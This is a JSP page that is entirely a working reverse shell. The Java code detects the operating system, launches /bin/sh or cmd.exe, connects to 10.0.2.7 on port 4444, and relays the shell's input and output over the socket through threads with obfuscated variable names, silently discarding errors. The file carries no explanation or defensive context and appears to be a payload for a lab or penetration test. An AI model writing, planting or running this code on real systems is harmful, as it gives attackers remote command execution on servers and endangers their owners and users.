<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream nn;
    OutputStream cK;

    StreamConnector( InputStream nn, OutputStream cK )
    {
      this.nn = nn;
      this.cK = cK;
    }

    public void run()
    {
      BufferedReader d3  = null;
      BufferedWriter aUt = null;
      try
      {
        d3  = new BufferedReader( new InputStreamReader( this.nn ) );
        aUt = new BufferedWriter( new OutputStreamWriter( this.cK ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = d3.read( buffer, 0, buffer.length ) ) > 0 )
        {
          aUt.write( buffer, 0, length );
          aUt.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( d3 != null )
          d3.close();
        if( aUt != null )
          aUt.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.0.2.7", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
